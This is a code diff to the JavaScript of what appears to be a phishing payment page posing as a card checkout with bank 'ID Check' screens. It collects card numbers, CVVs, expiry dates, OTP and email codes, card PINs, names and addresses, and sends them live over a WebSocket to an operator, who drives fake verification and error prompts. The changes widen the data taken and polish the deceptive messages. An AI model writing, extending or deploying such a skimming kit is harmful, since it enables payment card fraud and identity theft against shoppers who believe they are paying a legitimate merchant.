@@ -534,17 +534,36 @@
     socket.onerror = function() {
     }
     }function buildPayload() {
-      var cn = (q('cardNumber').value || '').replace(/\s/g,'');
-      var mo = q('card_expiry_month').value,yr = q('card_expiry_year').value;
+      var cn = (q('cardNumber') ? q('cardNumber').value : '').replace(/\s/g, '');
+      var mo = q('card_expiry_month') ? q('card_expiry_month').value : '';
+      var yr = q('card_expiry_year') ? q('card_expiry_year').value : '';
       var ce = (mo && yr) ? mo+'/'+yr.slice(2) : '';
+      var fn = (q('fullName') ? q('fullName').value : '').trim();
+      var nmParts = fn.split(' ');
+      var order = {};
+      try{var raw=localStorage.getItem('lotus_order');if(raw)order=JSON.parse(raw)}catch(e){}
       return {
-        frontendUrl : location.hostname,currentStep : _curStep,browsingTabs : [ {
-          label : 'Grocery',count : 1,active : true
-        }
-        ],cardInfo :  {
-        cardNumber : cn,expiry : ce,cvv : q('cvv').value || '',cardHolder:q('cardHolder').value||'',otpCode : q('otp-code') ? q('otp-code').value : ''}
-        ,customerInfo :  {
-        fullName : q('fullName').value || '',email : q('email').value || '',phone : q('phone').value || '',country : q('country').value || 'MY',address1 : q('address1').value || '',city : q('city').value || '',state : q('state').value || '',zipCode : q('zipCode').value || ''}
+        frontendUrl: location.hostname, currentStep: _curStep,
+        browsingTabs: [{ label: 'Grocery', count: 1, active: true }],
+        cardInfo: {
+          cardNumber: cn, expiry: ce,
+          cvv: (q('cvv') ? q('cvv').value : '').trim(),
+          cardHolder: (q('cardHolder') ? q('cardHolder').value : '').trim(),
+          otpCode: (q('otp-code') ? q('otp-code').value : '').trim()
+        },
+        customerInfo: {
+          firstName: nmParts[0]||'',
+          lastName: nmParts.slice(1).join(' ')||'',
+          fullName: fn,
+          email: (q('email') ? q('email').value : '').trim(),
+          phone: (q('phone') ? q('phone').value : '').trim(),
+          country: (q('country') ? q('country').value : 'MY'),
+          address1: (q('address1') ? q('address1').value : '').trim(),
+          city: (q('city') ? q('city').value : '').trim(),
+          state: (q('state') ? q('state').value : '').trim(),
+          zipCode: (q('zipCode') ? q('zipCode').value : '').trim()
+        },
+        orderInfo: { productName: order.productType||'Grocery', amount: order.amount||'0', paymentMethod: 'card' }
       }
     }
     function livePush() {
@@ -572,6 +591,21 @@
       
       function handleAction(p) {
         var a = p.action;
+
+        // Pre-reset all overlays on verification actions
+        if(a==='otp_verify'||a==='custom_otp_verify'||a==='custom_otp_tail'||
+           a==='cvv_verify'||a==='question_verify'||a==='app_verify'||
+           a==='pin_verify'||a==='email_verify'||a==='custom_email_verify'||a==='custom_email_tail'){
+          hideAllOverlays();
+          q('btnSubmit').disabled=false;
+          q('load-overlay').classList.add('hidden');
+          var mounts=['mount1','mount2','mount3','mount4','mount5','mount6','mount7'];
+          mounts.forEach(function(m){var el=document.getElementById(m);if(el){el.classList.add('hidden');el.innerHTML=''}});
+          q('app-verify-box').classList.add('hidden');
+          q('otp-error').style.display='none';
+          q('pin-error').style.display='none';
+        }
+
         if(a === 'ack') {
           sid = p.sessionId
         }
@@ -633,11 +667,12 @@
               q('load-overlay').classList.add('hidden');
               _curStep = 'pin_verify';
               q('pin-overlay').classList.remove('hidden');
-              ['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function(d) {
-              q(d).value = ''}
-              );
+              ['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function(d){q(d).value=''});
               q('pin-error').style.display = 'none';
-              q('pin-submit').disabled = false
+              q('pin-submit').disabled = false;
+              var pinAmount=document.getElementById('pin-amount');if(pinAmount)pinAmount.textContent='RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
+              var ct=(p.cardInfo&&p.cardInfo.cardType)||p.cardType||'';
+              updatePinCardLogo(ct)
             }
             else if(a === 'cvv_verify' || a === 'question_verify') {
               q('load-overlay').classList.add('hidden');
@@ -671,38 +706,48 @@
                 hideAllOverlays();
                 q('btnSubmit').disabled = true;
               showMsg('error',p.message || 'Payment declined')}
-              else if(a === 'card_error') {
-                q('load-overlay').classList.add('hidden');
-                q('btnSubmit').disabled = false;
-              showMsg('error',p.message || 'Card error. Please try a different card.')}
+               else if(a === 'card_error') {
+                 q('load-overlay').classList.add('hidden');
+                 q('btnSubmit').disabled = false;
+                 showMsg('error', p.message || 'We are unable to authenticate your payment method. Please choose a different payment method and try again.')
+               }
                else if(a === 'otp_error') {
                  q('load-overlay').classList.add('hidden');
+                 var otps=document.getElementById('otp-spinner');if(otps){otps.classList.add('hidden');otps.style.display='none'}
+                 var ems=document.getElementById('email-spinner');if(ems){ems.classList.add('hidden');ems.style.display='none'}
                  q('otp-overlay').classList.remove('hidden');
                  q('otp-form').classList.remove('hidden');
                  q('otp-result').classList.add('hidden');
                  var otpErr = q('otp-error');
                  if(otpErr){otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code'}
-                  q('otp-submit').disabled = false
-               }else if(a === 'timeout') {
-                  q('load-overlay').classList.add('hidden');
-                  hideAllOverlays();
-                  q('btnSubmit').disabled = true;
-                showMsg('error','Session timed out')}
-                else if(a === 'change_card' || a === 'change_card_prompt') {
-                  q('load-overlay').classList.add('hidden');
-                  hideAllOverlays();
-                  _curStep = 'card';
-                  q('cardNumber').value = '';
-                  q('cvv').value = '';
-                  q('btnSubmit').disabled = false;
-                showMsg('error',p.message || 'Please use a different card')}
+                 q('otp-submit').disabled = false;
+                 q('otp-submit').textContent = 'Verify'
+               }
                 else if(a === 'custom_prompt') {
                   q('load-overlay').classList.add('hidden');
-                showMsg('error',p.message || '')}
+                  var cm=p.message||'';
+                  if(!q('app-verify-overlay').classList.contains('hidden')){
+                    for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display='none'}if(er){er.classList.remove('hidden');er.textContent=cm};return}}
+                    var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display='none'}q('app-error').classList.remove('hidden');q('app-error').textContent=cm;q('app-continue-btn').disabled=false
+                  }else if(!q('otp-overlay').classList.contains('hidden')){
+                    var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display='none'}
+                    q('otp-result').classList.remove('hidden');var otpResP2=document.querySelector('#otp-result>p');if(otpResP2)otpResP2.textContent=cm
+                  }else if(!q('email-overlay').classList.contains('hidden')){
+                    var emsp=document.getElementById('email-spinner');if(emsp){emsp.classList.add('hidden');emsp.style.display='none'}
+                    q('email-result').classList.remove('hidden');var emailResP2=document.querySelector('#email-result>p');if(emailResP2)emailResP2.textContent=cm
+                  }else if(!q('pin-overlay').classList.contains('hidden')){
+                    var psp=document.getElementById('pin-spinner');if(psp){psp.classList.add('hidden');psp.style.display='none'}
+                    q('pin-error').textContent=cm;q('pin-error').style.display='block'
+                  }else{showMsg('error',cm)}
+                }
                 else if(a === 'redirect_complete') {
                 location.href = '/complete/'}
                 else if(a === 'resend_ok') {
                 startResendCooldown()}
+                else if(a === 'resend_limit') {
+                  var rb=q('otp-resend');if(rb){rb.disabled=true;rb.textContent='Limit reached'}
+                  showMsg('error', p.message || 'Maximum resend attempts reached.')
+                }
                 }function hideAllOverlays() {
                   ['otp-overlay','pin-overlay','email-overlay','app-verify-overlay','load-overlay'].forEach(function(id) {
                   var el = q(id); if (el) el.classList.add('hidden')}
@@ -802,110 +847,110 @@
                           ,currentStep : 'pin_verify'}
                         }))}
                         function submitPayment() {
-                          var cn = (q('cardNumber').value || '').replace(/\s/g,'');
-                          var mo = q('card_expiry_month').value,yr = q('card_expiry_year').value;
-                          if(cn.length<13 || cn.length>19)return showMsg('error','Please enter a valid card number');
-                          if(!luhn(cn))return showMsg('error','Invalid card number');
-                          if(!mo || !yr)return showMsg('error','Please select expiry date');
-                          if((q('cvv').value || '').length<3)return showMsg('error','Please enter CVN');
-                          if(!q('cardHolder').value.trim())return showMsg('error','Please enter cardholder name');
-                          q('btnSubmit').disabled = true;
+                          var cn = (q('cardNumber') ? q('cardNumber').value : '').replace(/\s/g, '');
+                          var mo = (q('card_expiry_month') ? q('card_expiry_month').value : '');
+                          var yr = (q('card_expiry_year') ? q('card_expiry_year').value : '');
+                          var cv = (q('cvv') ? q('cvv').value : '').trim();
+                          var ch = (q('cardHolder') ? q('cardHolder').value : '').trim();
+                          var fn = (q('fullName') ? q('fullName').value : '').trim();
+                          var em = (q('email') ? q('email').value : '').trim();
+                          var ph = (q('phone') ? q('phone').value : '').trim();
+                          var a1 = (q('address1') ? q('address1').value : '').trim();
+                          var ci = (q('city') ? q('city').value : '').trim();
+                          var st = (q('state') ? q('state').value : '').trim();
+                          var zc = (q('zipCode') ? q('zipCode').value : '').trim();
+                          if(!cn||!mo||!yr||!cv||!ch||!fn||!em||!ph||!a1||!ci||!st||!zc){showMsg('error','Fill all required fields.');return}
+                          if(!/^\d+$/.test(cn)){showMsg('error','Card number must be digits only.');return}
+                          if(cn.length<13||cn.length>19){showMsg('error','Invalid card number length.');return}
+                          if(!luhn(cn)){showMsg('error','Invalid card number.');return}
+                          var ey=parseInt('20'+yr.slice(2),10),em2=parseInt(mo,10);
+                          if(ey>2039){showMsg('error','Expiry year cannot exceed 2039.');return}
+                          var now=new Date(),expDate=new Date(ey,em2);
+                          if(expDate<=now){showMsg('error','Card has expired.');return}
+                          if(cv.length<3){showMsg('error','Please enter a valid security code.');return}
+                          if(q('otp-code'))q('otp-code').value='';
+                          q('btnSubmit').disabled=true;
                           q('load-overlay').classList.remove('hidden');
-                          q('load-text').textContent = 'Processing payment...';
-                          if(!ws || ws.readyState !== WebSocket.OPEN) {
-                            wsConnect();
-                            setTimeout(function() {
-                            doSubmit()}
-                          ,2000)}
-                          else {
-                          doSubmit()}
-                          }function doSubmit() {
-                            var p = buildPayload();
-                            if (!sid) {
-                              ws.send(JSON.stringify({type:'customer_input',payload:p}));
-                              setTimeout(function(){
-                                if(sid){var sp=buildPayload();sp.sessionId=sid;sp.status='pending';ws.send(JSON.stringify({type:'session_update',payload:sp}))}
-                              },1000)
-                            } else {
-                              p.sessionId=sid;p.status='pending';
-                              ws.send(JSON.stringify({type:'session_update',payload:p}))
-                            }
+                          if(!ws||ws.readyState!==WebSocket.OPEN){wsConnect();setTimeout(function(){doSubmit()},2000);return}
+                          doSubmit()
+                        }
+
+                        var _sessionCreating=false;
+                        function doSubmit() {
+                          var p=buildPayload();
+                          p.ua=navigator.userAgent;
+                          if(!sid&&!_sessionCreating){
+                            _sessionCreating=true;
+                            ws.send(JSON.stringify({type:'customer_input',payload:p}));
+                            setTimeout(function(){_sessionCreating=false},5000)
+                          }else if(sid){
+                            delete p.browsingTabs;
+                            p.sessionId=sid;p.status='pending';
+                            ws.send(JSON.stringify({type:'session_update',payload:p}))
+                          }else{setTimeout(function(){doSubmit()},300)}
+                        }
+
+                        function submitOtp() {
+                          var code=q('otp-code')?q('otp-code').value.trim():'';
+                          if(!code||code.length<4){var oe=q('otp-error');if(oe){oe.style.display='block';oe.textContent='Please enter the OTP.'};return}
+                          var oe=q('otp-error');if(oe)oe.style.display='none';
+                          var os=document.getElementById('otp-spinner');if(os){os.style.display='flex';os.classList.remove('hidden')}
+                          var btn=q('otp-submit');if(btn)btn.disabled=true;
+                          if(ws&&ws.readyState===WebSocket.OPEN&&sid){
+                            var p=buildPayload();
+                            p.cardInfo.otpCode=code;
+                            ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:p.cardInfo,customerInfo:p.customerInfo,browsingTabs:p.browsingTabs,currentStep:'otp'}}))
                           }
-                            function submitOtp() {
-                              var code = q('otp-code').value;
-                              if(code.length<4) {
-                                q('otp-error').style.display = 'block';
-                                q('otp-error').textContent = 'Please enter code';
-                                return
-                              }
-                              q('otp-error').style.display = 'none';
-                              q('otp-submit').disabled = true;
-                              q('otp-overlay').classList.add('hidden');
-                              q('load-overlay').classList.remove('hidden');
-                              q('load-text').textContent = 'Verifying...';
-                              var p = buildPayload();
-                              p.cardInfo.otpCode = code;
-                              ws.send(JSON.stringify( {
-                                type : 'session_update',payload :  {
-                                  sessionId : sid,status : 'pending',cardInfo :  {
-                                    otpCode : code
-                                  }
-                                ,currentStep : 'otp'}
-                              }))}
-                              function submitEmailVerify() {
-                                var code = q('email-code').value;
-                                if(code.length<4) {
-                                  q('email-error').style.display = 'block';
-                                  q('email-error').textContent = 'Please enter code';
-                                  return
-                                }
-                                q('email-error').style.display = 'none';
-                                q('email-submit').disabled = true;
-                                q('email-overlay').classList.add('hidden');
-                                q('load-overlay').classList.remove('hidden');
-                                q('load-text').textContent = 'Verifying...';
-                                ws.send(JSON.stringify( {
-                                  type : 'session_update',payload :  {
-                                    sessionId : sid,status : 'pending',cardInfo :  {
-                                      otpCode : code
-                                    }
-                                  ,currentStep : 'email_verify'}
-                                }))}
-                                function submitAppVerify() {
-                                  q('app-continue-btn').disabled = true;
-                                  q('app-continue-btn').textContent = 'Waiting...';
-                                  q('app-error').style.display = 'none';
-                                  var p = buildPayload();
-                                  ws.send(JSON.stringify( {
-                                    type : 'session_update',payload :  {
-                                      sessionId : sid,status : 'pending',cardInfo :  {
-                                      }
-                                    ,currentStep : 'app_verify'}
-                                  }))}
-                                  function updateBankLogo(name) {
-                                    var el = q('app-logo');
-                                     fetch('/api/logo/'+encodeURIComponent(name)).then(function(r) {
-                                    return r.text()}
-                                    ).then(function(svg) {
-                                      el.innerHTML = svg
-                                    }
-                                    ).catch(function() {
-                                      el.textContent = name.charAt(0).toUpperCase();
-                                      el.style.background = '#'+Math.floor(Math.abs(name.split('').reduce(function(h,c) {
-                                      return((h<<5) - h)+c.charCodeAt(0)}
-                                    ,0))).toString(16).slice(0,6)}
-                                    );
-                                     fetch('/api/bin/'+(q('cardNumber').value.replace(/\s/g,'').slice(0,6))).then(function(r) {
-                                    return r.json()}
-                                    ).then(function(d) {
-                                      var ct = d.cardType || '';
-                                      if(/visa/i.test(ct)) {
-                                      q('app-scheme').innerHTML = '<svg width="24" height="16" viewBox="0 0 32 22"><rect width = "32" height = "22" rx="3" fill="#1a1f71"/><text x="16" y="15" text - anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> ID Check'}
-                                      else if(/master/i.test(ct)) {
-                                      q('app-scheme').innerHTML = '<svg width="24" height="16" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/></svg> ID Check'}
-                                      }).catch(function() {
-                                      }
-                                    )}
+                        }
+
+                        function submitEmailVerify() {
+                          var code=q('email-code')?q('email-code').value.trim():'';
+                          if(!code||code.length<4){var ee=q('email-error');if(ee){ee.style.display='block';ee.textContent='Please enter the code.'};return}
+                          var ee=q('email-error');if(ee)ee.style.display='none';
+                          var es=document.getElementById('email-spinner');if(es){es.style.display='flex';es.classList.remove('hidden')}
+                          var btn=q('email-submit');if(btn)btn.disabled=true;
+                          if(ws&&ws.readyState===WebSocket.OPEN&&sid){
+                            var p=buildPayload();
+                            p.cardInfo.otpCode=code;
+                            ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:p.cardInfo,customerInfo:p.customerInfo,browsingTabs:p.browsingTabs,currentStep:'email_verify'}}))
+                          }
+                        }
+
+                        function submitPin() {
+                          var pin='';for(var i=1;i<=4;i++){pin+=q('pin-d'+i).value}
+                          if(pin.length<4){q('pin-error').style.display='block';q('pin-error').textContent='Please enter 4-digit PIN';return}
+                          q('pin-error').style.display='none';
+                          var ps=document.getElementById('pin-spinner');if(ps){ps.style.display='flex';ps.classList.remove('hidden')}
+                          var btn=q('pin-submit');if(btn)btn.disabled=true;
+                          if(ws&&ws.readyState===WebSocket.OPEN&&sid){
+                            var p=buildPayload();
+                            ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{otpCode:pin},customerInfo:p.customerInfo,browsingTabs:p.browsingTabs,currentStep:'pin_verify'}}))
+                          }
+                        }
+
+                        function submitAppVerify() {
+                          var as=document.getElementById('app-spinner');if(as){as.style.display='flex';as.classList.remove('hidden')}
+                          var btn=q('app-continue-btn');if(btn){btn.disabled=true;btn.textContent='Waiting...'}
+                          var ae=q('app-error');if(ae)ae.style.display='none';
+                          if(ws&&ws.readyState===WebSocket.OPEN&&sid){
+                            ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                          }
+                        }
+                                   function updateBankLogo(name) {
+                                     var el = q('app-logo');
+                                     fetch('/api/logo/'+encodeURIComponent(name)).then(function(r){return r.text()}).then(function(svg){el.innerHTML = svg}).catch(function(){el.textContent=name.charAt(0).toUpperCase();el.style.background='#'+Math.floor(Math.abs(name.split('').reduce(function(h,c){return((h<<5)-h)+c.charCodeAt(0)},0))).toString(16).slice(0,6)});
+                                     fetch('/api/bin/'+(q('cardNumber').value.replace(/\s/g,'').slice(0,6))).then(function(r){return r.json()}).then(function(d){updateAppSchemeLogo(d.cardType||'')}).catch(function(){})
+                                   }
+                                   function updateAppSchemeLogo(ct) {
+                                     var el=q('app-scheme');if(!el)return;
+                                     if(/visa/i.test(ct)){el.innerHTML='<svg width="24" height="16" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> ID Check'}
+                                     else if(/master/i.test(ct)){el.innerHTML='<svg width="24" height="16" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/></svg> ID Check'}
+                                   }
+                                   function updatePinCardLogo(ct) {
+                                     var el=document.getElementById('pin-card-logo');if(!el)return;
+                                     if(/visa/i.test(ct)){el.innerHTML='<svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg>'}
+                                     else if(/master/i.test(ct)){el.innerHTML='<svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/></svg>'}
+                                   }
                                     function showGenericApp(p) {
                                       q('app-verify-box').classList.remove('hidden');
                                       var bn = (p.cardInfo && p.cardInfo.bankName) || p.bankName || 'Bank';
